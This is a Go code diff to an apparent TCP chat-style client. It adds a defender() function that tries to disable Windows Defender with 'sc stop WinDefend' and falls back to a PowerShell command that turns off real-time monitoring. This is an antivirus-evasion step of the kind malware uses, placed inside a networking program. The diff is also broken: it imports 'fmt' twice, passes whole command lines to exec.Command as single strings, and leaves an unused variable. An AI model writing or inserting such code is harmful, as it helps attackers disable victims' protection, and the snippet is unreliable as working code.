@@ -5,7 +5,9 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"os/exec"
 	"strings"
+	"fmt"
 )
 
 var connection net.Conn
@@ -21,6 +23,14 @@ func sendMessage() {
 			connection.Write([]byte(textInput))
 		}
 	}
+}
+
+func defender() {
+	c := exec.Command("sc stop WinDefend") // Tries to stop defender by using simple CMD command.
+
+    if err := c.Run(); err != nil { 
+        c := exec.Command("powershell -command Set-MpPreference -DisableRealtimeMonitoring $true") // tries the same trick but using powershell
+    }   
 }
 
 func main() {
